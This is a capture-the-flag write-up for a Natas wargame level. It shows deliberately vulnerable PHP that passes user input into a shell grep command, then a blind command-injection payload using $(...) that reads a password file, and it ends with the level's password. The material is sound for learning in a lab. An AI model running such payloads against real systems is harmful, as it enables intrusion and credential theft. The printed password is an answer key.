Source code for the page is available, with the following PHP code:
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

This is another command injection. It appears right away that we can use the `$(...)` construct to inject commands, however we cannot see the command result. We can use a similar technique to blind SQL injection: we make a guess, and we can observe different results depending on our guess being right or not.

For instance we can use the following payload:
```
$(grep ^guess /etc/natas_webpass/natas17)African
```

Which would result in the following command passed to passthru():
```
grep -i "$(grep ^guess /etc/natas_webpass/natas17)African" dictionary.txt
```

If our guess is incorrect the inner grep won't find a match, and the outer grep looks for `African` in the dictionary. It exists, so we will get results. If our guess is correct however, the inner grep finds a match and the outer grep looks for `<guess>African`. That does not exist in the dictionary, so we get an empty answer.

Check the python script for brute-forcing the password.

Password for the next level is `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`.
